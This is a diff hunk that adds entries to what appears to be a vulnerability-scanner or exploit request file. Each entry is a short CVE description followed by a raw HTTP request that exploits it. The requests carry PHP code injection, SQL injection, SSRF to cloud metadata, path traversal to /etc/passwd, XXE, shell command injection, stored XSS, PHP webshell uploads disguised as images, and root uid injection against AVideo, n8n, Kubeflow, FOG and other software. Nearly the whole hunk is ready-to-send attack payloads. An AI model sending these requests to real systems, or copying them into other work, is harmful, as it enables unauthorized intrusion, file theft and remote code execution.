@@ -4847,3 +4847,64 @@ POST /admin/task.php?mod=qbanner&run=edit.php header="Content-Type: multipart/fo
 #     caller's .php extension, and writes it under pub/media/custom_options. ---
 POST /rest/default/V1/guest-carts/abc123/items header="Content-Type: application/json" body="{\"cartItem\":{\"sku\":\"shirt\",\"qty\":1,\"product_option\":{\"extension_attributes\":{\"custom_options\":[{\"option_id\":\"999999\",\"option_value\":\"file\",\"extension_attributes\":{\"file_info\":{\"base64_encoded_data\":\"R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==\",\"type\":\"image/gif\",\"name\":\"payload.php\"}}}]}}}}"
 PUT /rest/V1/guest-carts/abc123/items/42 header="Content-Type: application/json" body="{\"cartItem\":{\"sku\":\"shirt\",\"qty\":1,\"product_option\":{\"extension_attributes\":{\"custom_options\":[{\"option_id\":\"999999\",\"option_value\":\"file\",\"extension_attributes\":{\"file_info\":{\"base64_encoded_data\":\"R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==\",\"type\":\"image/gif\",\"name\":\"payload.phtml\"}}}]}}}}"
+
+# --- CVE-2026-61564 (AVideo): the unauthenticated installer interpolates
+#     webSiteRootURL into a single-quoted PHP literal in configuration.php. ---
+POST /install/checkConfiguration.php header="Content-Type: application/x-www-form-urlencoded" body="systemRootPath=/var/www/html&webSiteRootURL=%27%3Bsystem(%27id%27)%3B%2F%2F&databaseHost=db.example.com&databaseUser=kunato&databasePass=secret"
+
+# --- CVE-2026-61569 (AVideo): html_entity_decode restores the single quotes
+#     that objects/security.php stripped, so the user parameter reaches the
+#     Streamer SELECT as a UNION injection. ---
+GET /objects/login.json.php?user=%27%20UNION%20SELECT%20streamers_id,2,3%20FROM%20streamers--%20-&pass=x&siteURL=https%3A%2F%2Fexample.com
+
+# --- CVE-2026-61572 (AVideo): url_get_contents and the FTP downloader accept
+#     caller-controlled destinations without rejecting internal addresses. ---
+GET /objects/login.json.php?user=alice&pass=x&siteURL=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
+GET /view/youtubeDl.json.php?videoURL=ftp%3A%2F%2F127.0.0.1%2Fetc%2Fpasswd
+
+# --- CVE-2026-63190 (FearlessCMS): the debug scripts skip authentication and
+#     pass the path parameter to file reads and writes after router.php's
+#     unnormalized /./admin/ prefix check. ---
+GET /./admin/debug_content.php?path=../../../../etc/passwd
+POST /./admin/debug_save_flow.php header="Content-Type: application/x-www-form-urlencoded" body="path=../../../../var/www/html/content/shell.md&content=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+
+# --- CVE-2026-118758 (Kubeflow Pipelines): the volume artifact handler does
+#     not confine the caller-supplied path to the selected volume. ---
+GET /artifacts/get?source=volume&path=../../../../etc/passwd
+
+# --- CVE-2026-59179 (OpenHop): the flow id is decoded and joined into the flow
+#     directory path without an identifier allowlist. ---
+GET /api/flows/..%2F..%2F..%2Fetc%2Fpasswd
+DELETE /api/flows/..%2F..%2F..%2Fetc%2Fpasswd
+
+# --- CVE-2026-66090 (openEQUELLA): item metadata XML resolves external
+#     entities, enabling file reads and SSRF through /api/item. ---
+POST /api/item header="Content-Type: application/xml" body="<item><metadata><!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><name>&e;</name></metadata></item>"
+
+# --- CVE-2026-54455 (OpenCATS): the activity DataGrid interpolates the
+#     startDate and endDate filters into SQL comparisons without escaping. ---
+POST /index.php?m=home&a=ajaxCalls header="Content-Type: application/x-www-form-urlencoded" body="mode=callDataGrid&period=custom&startDate=2026-01-01%27%20AND%20SLEEP(5)--%20-&endDate=2026-02-01"
+
+# --- CVE-2026-114278 (che-machine-exec): the username and namespace JSON
+#     fields are concatenated into a double-quoted sh -c command. ---
+POST /exec/init header="Content-Type: application/json" body="{\"username\":\"$(id)\",\"namespace\":\"default\"}"
+
+# --- CVE-2026-117493 (Sisense BloX): dashboard widgets accept HTML and
+#     JavaScript in the desc and text parameters, which render in the browser. ---
+POST /api/dashboards/1/widgets/2 header="Content-Type: application/json" body="{\"desc\":\"<script>alert(1)</script>\",\"text\":\"x\"}"
+
+# --- CVE-2026-118648 (n8n): webhook response paths without the sandbox CSP
+#     serve stored HTML on the n8n origin. ---
+POST /rest/workflows header="Content-Type: application/json" body="{\"name\":\"x\",\"nodes\":[],\"connections\":{},\"settings\":{\"responseMode\":\"responseNode\"},\"responseData\":\"<script>alert(1)</script>\"}"
+
+# --- CVE-2026-117607 (Xerte Online Toolkits): a language pack imported through
+#     import_language.php can carry an executable .inc file. ---
+POST /website_code/php/language/import_language.php header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d226c616e67756167655f66696c65223b2066696c656e616d653d226576696c2e696e63220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f706870206563686f20313b203f3e0d0a2d2d582d2d0d0a
+
+# --- CVE-2026-58255 (Cronicle): top-level uid and gid fields injected through
+#     create_event or update_event survive into the child-process launch. ---
+POST /api/app/create_event header="Content-Type: application/json" body="{\"title\":\"maintenance\",\"plugin\":\"shellplug\",\"uid\":0,\"gid\":0,\"params\":{}}"
+
+# --- CVE-2026-116778 (FOG): a low-privileged API user can set the Storage Node
+#     ftppath, which FOGImageReplicator interpolates into an lftp command. ---
+PUT /fog/storagenode/1/edit header="Content-Type: application/json" body="{\"name\":\"node\",\"user\":\"fog\",\"pass\":\"secret\",\"ftppath\":\"/images;id\"}"
